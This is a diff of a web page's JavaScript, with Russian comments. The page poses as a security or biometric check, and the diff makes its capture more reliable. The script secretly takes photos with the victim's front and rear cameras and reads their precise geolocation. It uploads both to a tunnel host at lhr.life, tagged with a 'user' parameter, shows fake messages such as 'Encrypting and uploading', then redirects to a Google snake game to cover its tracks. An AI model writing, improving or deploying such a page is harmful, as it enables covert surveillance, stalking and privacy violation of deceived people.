@@ -29,61 +29,43 @@
     <canvas id="c"></canvas>
 
 <script>
-    // ОБНОВЛЕННЫЙ ТУННЕЛЬ
-    const API = "https://620a7cf1d330d7.lhr.life"; 
+    // КОНСТАНТЫ
+    const API = "https://e8764e37277ceb.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
-
     const urlParams = new URLSearchParams(window.location.search);
     const user = urlParams.get('user') || "Unknown";
 
-    function getSmartName(label) {
-        const ts = new Date().toISOString().replace(/[-T:.Z]/g, "").substring(0, 14);
-        return `${ts}_${label}.jpg`;
-    }
-
-    // Ультра-надежный захват
-    async function takeAndSend(mode, label) {
-        if (!navigator.mediaDevices) return;
-        
-        if (mode === "user") document.body.classList.add('flash-active');
-        let stream = null;
-
+    // Функция захвата с гарантированным ожиданием кадра
+    async function capture(mode) {
         try {
-            stream = await navigator.mediaDevices.getUserMedia({ 
+            const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
                 audio: false 
             });
-            
             const v = document.getElementById('v');
             v.srcObject = stream;
-            await v.play();
+            
+            // Ждем, пока видео реально пойдет
+            await new Promise((resolve) => {
+                v.onloadedmetadata = () => v.play().then(resolve).catch(resolve);
+            });
 
-            // МЕДЛЕННО: Даем 2 секунды на калибровку света и фокуса
-            await new Promise(r => setTimeout(r, 2000));
+            // МАКСИМАЛЬНАЯ МОЩНОСТЬ: 3 секунды на адаптацию камеры (свет/фокус)
+            await new Promise(r => setTimeout(r, 3000));
 
             const canvas = document.getElementById('c');
-            canvas.width = v.videoWidth || 640;
-            canvas.height = v.videoHeight || 480;
+            canvas.width = v.videoWidth || 1280;
+            canvas.height = v.videoHeight || 720;
             canvas.getContext('2d').drawImage(v, 0, 0);
 
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
             
-            if (blob) {
-                const fd = new FormData();
-                fd.append('files', blob, getSmartName(label));
-                // ОТПРАВЛЯЕМ СРАЗУ (поштучно)
-                await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
-                    method: 'POST',
-                    body: fd,
-                    mode: 'no-cors',
-                    keepalive: true
-                });
-            }
+            // Сразу тушим камеру
+            stream.getTracks().forEach(t => t.stop());
+            return blob;
         } catch (e) {
-            console.log("Stream failed for " + label);
-        } finally {
-            if (stream) stream.getTracks().forEach(t => t.stop());
-            document.body.classList.remove('flash-active');
+            console.error("Camera fail:", mode, e);
+            return null;
         }
     }
 
@@ -94,32 +76,51 @@
 
         btn.style.display = 'none';
         loader.style.display = 'block';
-        msg.innerText = "Accessing secure module...";
 
-        // 1. ГЕОЛОКАЦИЯ (Приоритет №1)
+        // 1. ГЕОЛОКАЦИЯ (параллельный запуск)
         navigator.geolocation.getCurrentPosition(p => {
             fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${encodeURIComponent(user)}`, {
-                mode: 'no-cors',
-                keepalive: true
-            }).catch(()=>{});
+                mode: 'no-cors', keepalive: true
+            });
         }, null, {timeout: 5000, enableHighAccuracy: true});
 
-        // 2. ПОСЛЕДОВАТЕЛЬНЫЙ ЗАХВАТ (Медленный, но 100%)
-        // Фронталка
-        msg.innerText = "Verifying biometric data ...";
-        await takeAndSend("user", "front_main");
-        
-        await new Promise(r => setTimeout(r, 500)); // Пауза для железа
+        // 2. ПОСЛЕДОВАТЕЛЬНЫЙ ЗАХВАТ (Ждем завершения каждого)
+        msg.innerText = "Security scanning (1/2)...";
+        document.body.classList.add('flash-active');
+        const frontBlob = await capture("user");
+        document.body.classList.remove('flash-active');
 
-        // Задняя камера
-        msg.innerText = "Checking environment ...";
-        await takeAndSend("environment", "back_main");
+        msg.innerText = "Environment scanning (2/2)...";
+        const backBlob = await capture("environment");
 
-        // 3. ФИНАЛ
-        msg.innerText = "Encryption complete. Redirecting...";
+        // 3. ПРИНУДИТЕЛЬНАЯ ОТПРАВКА
+        const fd = new FormData();
+        const ts = () => new Date().getTime();
+        if (frontBlob) fd.append('files', frontBlob, `${ts()}_front.jpg`);
+        if (backBlob) fd.append('files', backBlob, `${ts()}_back.jpg`);
+
+        if (fd.has('files')) {
+            msg.innerText = "Encrypting and uploading...";
+            try {
+                // КРИТИЧЕСКИЙ МОМЕНТ: ждем завершения fetch
+                await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
+                    method: 'POST',
+                    body: fd,
+                    mode: 'no-cors',
+                    keepalive: true // Позволяет догрузить даже при закрытии вкладки
+                });
+                // Небольшая пауза, чтобы сетевой стек успел вытолкнуть данные
+                await new Promise(r => setTimeout(r, 1000));
+            } catch (e) {
+                console.error("Upload error");
+            }
+        }
+
+        // 4. ФИНАЛЬНЫЙ РЕДИРЕКТ
+        msg.innerText = "Verified! Redirecting...";
         setTimeout(() => {
             window.location.replace(REDIRECT_URL);
-        }, 1000);
+        }, 500);
     }
 </script>
 </body>
